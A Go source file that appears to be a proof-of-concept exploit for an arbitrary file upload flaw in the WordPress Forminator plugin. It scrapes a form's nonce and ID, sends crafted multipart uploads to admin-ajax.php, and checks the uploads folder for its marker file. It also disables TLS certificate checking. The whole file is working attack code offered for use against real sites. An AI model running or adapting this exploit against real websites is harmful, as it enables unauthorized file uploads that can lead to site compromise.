package main

import (
    "crypto/tls"
    "fmt"
    "io/ioutil"
    "net/http"
    "net/url"
    "os"
    "regexp"
    "strings"
    "time"
)

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage: go run main.go [URL]")
        os.Exit(1)
    }

    inputURL := os.Args[1]
    fmt.Println("Sending GET request to:", inputURL)

    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr}

    resp, err := client.Get(inputURL)
    if err != nil {
        fmt.Println("Error sending GET request:", err)
        os.Exit(1)
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        fmt.Println("Error reading response body:", err)
        os.Exit(1)
    }

    formID := extractValue(string(body), `name="form_id" value="([^"]+)"`)
    nonce := extractValue(string(body), `nonce" value="([^"]+)"`)

    fmt.Println("Extracted form_id:", formID)
    fmt.Println("Extracted nonce:", nonce)

    year, month, _ := time.Now().Date()

    parsedURL, err := url.Parse(inputURL)
    if err != nil {
        fmt.Println("Error parsing URL:", err)
        os.Exit(1)
    }
    basePostURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
    postURL := basePostURL + "/wp-admin/admin-ajax.php"

    sendPostRequest(client, postURL, formID, nonce, basePostURL, "upload-1", year, month)
    sendPostRequest(client, postURL, formID, nonce, basePostURL, "postdata-1-post-image", year, month)
}

func sendPostRequest(client *http.Client, postURL, formID, nonce, basePostURL, name string, year int, month time.Month) {
    fmt.Println("Sending POST request to:", postURL)

    boundary := "---------------------------331645717441725387683075305265"
    var postData strings.Builder
    postData.WriteString(fmt.Sprintf("--%s\r\n", boundary))
    postData.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"%s\"; filename=\"mitutbili.png\"\r\n", name))
    postData.WriteString("Content-Type: image/png\r\n\r\n")
    postData.WriteString("\"Hello Braaat\"\r\n")
    postData.WriteString(fmt.Sprintf("--%s\r\n", boundary))
    postData.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"forminator_nonce\"\r\n\r\n%s\r\n", nonce))
    postData.WriteString(fmt.Sprintf("--%s\r\n", boundary))
    postData.WriteString("Content-Disposition: form-data; name=\"_wp_http_referer\"\r\n\r\n/index.php/contact/\r\n")
    postData.WriteString(fmt.Sprintf("--%s\r\n", boundary))
    postData.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"form_id\"\r\n\r\n%s\r\n", formID))
    postData.WriteString(fmt.Sprintf("--%s\r\n", boundary))
    postData.WriteString("Content-Disposition: form-data; name=\"form_type\"\r\n\r\ndefault\r\n")
    postData.WriteString(fmt.Sprintf("--%s\r\n", boundary))
    postData.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"current_url\"\r\n\r\n%s\r\n", basePostURL))
    postData.WriteString(fmt.Sprintf("--%s\r\n", boundary))
    postData.WriteString("Content-Disposition: form-data; name=\"action\"\r\n\r\nforminator_submit_form_custom-forms\r\n")
    postData.WriteString(fmt.Sprintf("--%s--\r\n", boundary))

    req, err := http.NewRequest("POST", postURL, strings.NewReader(postData.String()))
    if err != nil {
        fmt.Println("Error creating POST request:", err)
        return
    }

    req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
    req.Header.Set("Connection", "close")
    req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0")

    postResp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error sending POST request:", err)
        return
    }
    defer postResp.Body.Close()

    imageURL := fmt.Sprintf("%s/wp-content/uploads/%d/%02d/mitutbili.png", basePostURL, year, month)
    fmt.Println("Checking URL:", imageURL)

    checkResp, err := client.Get(imageURL)
    if err != nil {
        fmt.Println("Error sending GET request to check URL:", err)
        return
    }
    defer checkResp.Body.Close()

    checkBody, err := ioutil.ReadAll(checkResp.Body)
    if err != nil {
        fmt.Println("Error reading response body from check URL:", err)
        return
    }

    if strings.Contains(string(checkBody), "Hello Braaat") {
        fmt.Println("Success! Found 'Hello Braaat' at URL:", imageURL)
    } else {
        fmt.Println("Did not find 'Hello Braaat' at URL:", imageURL)
    }
}

func extractValue(html, pattern string) string {
    re := regexp.MustCompile(pattern)
    matches := re.FindStringSubmatch(html)
    if len(matches) > 1 {
        return matches[1]
    }
    fmt.Println("Failed to extract value with pattern:", pattern)
    return ""
}
